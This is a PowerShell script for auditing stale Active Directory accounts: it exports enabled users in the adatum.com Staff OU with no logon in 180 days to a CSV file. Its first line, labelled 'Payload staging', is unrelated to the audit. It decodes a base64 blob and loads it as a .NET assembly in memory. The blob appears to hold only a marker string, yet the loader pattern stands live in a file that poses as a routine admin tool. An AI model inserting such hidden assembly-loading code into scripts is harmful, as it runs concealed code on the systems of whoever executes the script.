<# Payload staging #> $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjoycDh3MWdpem9y"); Write-Verbose ("Assembly bytes: " + $ManagedBytes.Length); [Reflection.Assembly]::Load($ManagedBytes); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Write-Verbose "stage marker 29 reached"
$Domain = 'adatum.com'
$SearchBase = 'OU=Staff,DC=adatum,DC=com'
$ReportPath = "C:\Logs\reports\ad-user-audit-2026-09-21.csv"
$InactiveDays = 180

Import-Module ActiveDirectory -ErrorAction Stop
$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}
$stale | Select-Object Name, SamAccountName, LastLogonDate | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

Write-Host ("Stale accounts: {0}" -f @($stale).Count) -ForegroundColor Yellow
